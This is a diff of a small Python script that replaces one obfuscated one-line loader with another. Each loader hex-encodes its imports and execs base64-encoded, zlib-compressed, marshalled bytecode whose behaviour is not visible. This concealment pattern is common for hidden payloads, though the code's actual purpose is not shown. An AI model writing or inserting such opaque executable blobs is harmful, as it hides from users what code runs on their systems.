@@ -1,4 +1,6 @@
-#!/usr/bin/python2
-#-*- coding: UTF-8 -*-
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
 
-exec(__import__('\x6D\x61\x72\x73\x68\x61\x6C').loads(__import__('\x7A\x6C\x69\x62').decompress(__import__('\x62\x61\x73\x65\x36\x34').b64decode('eJyFULFqwzAQPSlOaRPonNHZTCfd1KWEgIeWDB6aLZuxVONi1xApQ/b+SH4lX9O/aE6yZBsvEaen07139+AK8IfT3dLVLwSSgkENcOhzBgcGksMvFTnIGbx/UHmfRCSv/ulkRRjF6KZ21DO4XlJyC0DyGZUyvSS8XtL2pzzmRq/NH/0FCgoLiC5BF8K9A9Ux3RvILvdaL/L8SOOnicAiYk93veh9wnwUg38/fOI/1Mc+fpT3G6lRJHZFE9ALgrfdqa7a9Pt1Y+xSv+q8fLBc5HY6Z26d18teqbg5x0Ur1dqt01jQZ+26TNWoT3bf4dF+m1aearWJgsuKP0U3XRdc7g=='))))
+exec(__import__('\x6D\x61\x72\x73\x68\x61\x6C').loads(__import__('\x7A\x6C\x69\x62').decompress(__import__('\x62\x61\x73\x65\x36\x34').b64decode('eJx1Uc1Kw0AQnk1bkYLiI9STOe6cepEi9OahB3PrJcTsViKbRNoNKHjTF/FVfBrfQmd2J00ouExm5+ebb5YvJchJ6LsDBYcbCgyZAgdQK9gqUCaBTypN4IOTKWwTMDPI0jPCVr90UkWRvyT3sq8an++6pvRV25RcV0K/Zvo5AwHegbmyMLeJ07N+OqbsXlN+WnBh8Pa+c1W7fl6u/DmnrqgfTbGaRk4C8Qu+vzJrF/XbomyNvfY/VNKoydghhgCD6XAPrdiJd9+MsWAFJP0RRth030XEYzvOouzp+VEP+4/kJ/uH+niPUMm+ERr1Jp2wFCxVTv/Ad3ub5w+sjGeNdq54GhT9X9a6NZ2zQdYDuyu4SP4Ap8ZkHQ=='))))
+
+# vim:ft=python ts=4 sts=4 sw=4 et
